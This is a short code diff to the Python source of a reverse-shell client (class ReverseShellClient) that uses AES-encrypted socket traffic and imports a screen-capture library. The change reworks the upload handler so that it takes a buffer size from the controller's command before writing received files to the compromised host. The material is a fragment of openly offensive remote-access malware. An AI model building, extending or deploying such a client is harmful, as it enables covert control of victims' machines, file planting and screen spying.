@@ -4,6 +4,7 @@ import os
 import sys
 from aes_crypt import AESCipher
 from time import sleep
+from base64 import b64encode, b64decode
 from PIL import ImageGrab
 
 
@@ -59,11 +60,14 @@ class ReverseShellClient:
             self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
 
     def handle_upload(self, command):
-        file_path = command.split(" ", 1)[1]
+        parts = command.split(" ", 2)
+        file_path = parts[1]
+        buffer_size = int(parts[2])
+
         try:
             with open(file_path, "wb") as f:
                 while True:
-                    data = self.conn.recv(4096).decode("utf-8")
+                    data = self.conn.recv(buffer_size).decode("utf-8")
                     decrypted_data = AESCipher.decrypt(data)
                     if decrypted_data == "EOF":
                         break
